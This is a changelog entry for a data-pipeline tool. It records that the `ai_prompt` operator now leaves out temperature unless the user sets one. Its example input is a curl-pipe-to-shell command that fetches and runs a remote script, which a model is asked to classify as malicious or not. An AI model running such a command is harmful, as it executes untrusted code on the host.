---
title: Optional temperature in ai_prompt
type: bugfix
authors:
  - mavam
created: 2026-10-09T11:13:55.459609Z
---

The `ai_prompt` operator no longer sends a `temperature` to the model unless you set one. Previously, it always sent `temperature=0.0`, so models that reject the parameter, such as `gpt-5-mini`, failed every request with an HTTP 400 error.

Leave out `temperature` to let the model use its own default:

```tql
from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
ai_prompt model="gpt-5-mini",
          endpoint="https://api.openai.com/v1",
          api_key=secret("openai-api-key"),
          system="Is this command malicious? Reply with JSON."
```

Set `temperature` explicitly to keep the previous behavior, for example `temperature=0.0`.
